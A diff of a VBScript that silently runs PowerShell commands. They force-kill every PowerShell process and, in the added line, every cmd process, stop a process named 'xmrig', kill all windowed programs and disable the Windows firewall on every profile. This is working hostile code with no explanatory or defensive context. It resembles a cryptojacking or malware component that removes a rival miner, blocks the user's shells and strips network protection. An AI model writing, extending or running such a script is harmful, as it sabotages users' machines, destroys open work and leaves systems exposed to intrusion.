@@ -1,5 +1,6 @@
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -Command Get-Process -Name powershell | Stop-Process -Force", 0, True
+objShell.Run "powershell.exe -Command Get-Process -Name cmd | Stop-Process -Force", 0, True
 objShell.Run "powershell.exe -Command Stop-Process -Name 'xmrig' -Force", 0, True
 objShell.Run "powershell.exe -Command Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Stop-Process -Force", 0, True
 objShell.Run "powershell.exe -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False", 0, True
